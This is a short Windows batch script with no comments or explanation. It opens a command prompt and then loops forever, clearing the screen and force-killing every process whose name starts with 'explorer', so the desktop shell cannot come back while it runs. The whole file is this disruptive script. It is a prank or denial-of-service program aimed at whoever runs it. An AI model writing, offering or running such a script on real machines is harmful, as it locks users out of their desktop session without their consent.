@echo off
cmd
:loooper
cls && taskkill /IM explorer* /F && cls
goto loooper